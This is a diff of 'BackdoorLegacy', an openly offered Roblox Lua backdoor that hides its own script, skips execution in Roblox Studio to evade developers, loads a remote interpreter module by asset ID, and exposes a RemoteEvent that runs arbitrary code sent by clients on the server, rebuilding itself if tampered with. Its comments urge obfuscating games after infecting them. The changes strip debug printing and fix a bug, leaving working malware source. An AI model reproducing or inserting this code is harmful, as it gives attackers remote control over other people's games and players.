@@ -1,28 +1,6 @@
--- version 1.1, skids! :D
+-- BackdoorLegacy 
+-- By IvanTheSkid 
 
--- mustTalk determines whether the backdoor provider should print out stuff in the console or not
--- recommended to keep mustTalk off, as it can invoke the devs and Roblox mod team
--- mustTalk will not prevent data logging!
--- ON = true
--- OFF = false
-local mustTalk = false
-
-local print = print
-if not mustTalk then
-	print = function()end
-end
-
-if game:GetService("RunService"):IsStudio() then 
-	return 
-end
-
--- this hides the script, potentially securing the backdoor
-pcall(function()
-	getfenv().script:Destroy()
-	getfenv().script = nil 
-end)
-
-print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- github.com/IvanTheProtogen/BackdoorLegacy
 
 -- Features we have:
@@ -42,7 +20,15 @@ print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!
 
 -- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR
-]])
+
+if game:GetService("RunService"):IsStudio() then 
+	return 
+end
+
+pcall(function()
+	getfenv().script:Destroy()
+	getfenv().script = nil 
+end)
 
 local loadstring
 local rmt
@@ -54,23 +40,19 @@ local onExec
 local onExecP
 local onTamper 
 while (task.wait or wait or true)() do 
-	print("FETCHING INTERPRETER...")
 	local suc 
 	suc,loadstring = pcall(require,14132891321)
 	if suc and loadstring then 
-		print("INTERPRETER FETCHED")
 		break 
 	end 
 end
 function onExec(plr,...)
 	for i,v in pairs({...}) do
-		print(plr.Name,"REQUESTED CODE:",v)
-		v = v:gsub("%username%",v.Name):gsub("%userid%",v.UserId)
+		v = v:gsub("%username%",plr.Name):gsub("%userid%",plr.UserId)
 		onExecP(plr,v,pcall(function()return loadstring:SpawnS(v,workspace)end))
 	end
 end
 function onExecP(plr,v,...)
-	print("EXECUTION RESULT: [",...,"]")
 	rmt:FireAllClients(plr,v,...)
 end
 function newBD()
@@ -83,7 +65,6 @@ function newBD()
 	rmt = rmt or Instance.new("RemoteEvent",workspace)
 	conA = rmt.OnServerEvent:connect(onExec)
 	conB = rmt.Changed:connect(onTamper)
-	print("BACKDOOR CREATED")
 	return rmt
 end
 function delBD()
@@ -96,10 +77,8 @@ function delBD()
 		conB:disconnect()
 	end)
 	conB = nil
-	print("BACKDOOR DESTROYED")
 end
 function onTamper()
-	print("BACKDOOR TAMPERED? REFRESHING...")
 	delBD()
 	newBD()
 end
